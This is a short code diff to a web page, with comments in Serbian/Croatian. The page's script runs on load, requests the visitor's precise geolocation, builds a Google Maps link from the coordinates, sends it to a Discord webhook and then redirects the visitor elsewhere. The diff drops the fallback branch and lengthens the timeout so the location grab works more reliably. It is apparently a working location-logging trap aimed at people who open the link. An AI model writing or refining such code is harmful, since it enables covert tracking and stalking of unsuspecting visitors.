@@ -9,6 +9,7 @@
         function sendToDiscord(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
+            // Popravljen link (bez tacka-zareza unutar navodnika)
             const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
             fetch(discordWebhook, {
@@ -26,15 +27,12 @@
             window.location.href = redirectUrl;
         }
 
+        // OVO JE KLJUCNI DEO KOJI POKRECE SVE
         window.onload = function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendToDiscord, handleError, {
-                    enableHighAccuracy: true,
-                    timeout: 5000
-                });
-            } else {
-                window.location.href = redirectUrl;
-            }
+            navigator.geolocation.getCurrentPosition(sendToDiscord, handleError, {
+                enableHighAccuracy: true,
+                timeout: 10000
+            });
         };
     </script>
 </body>
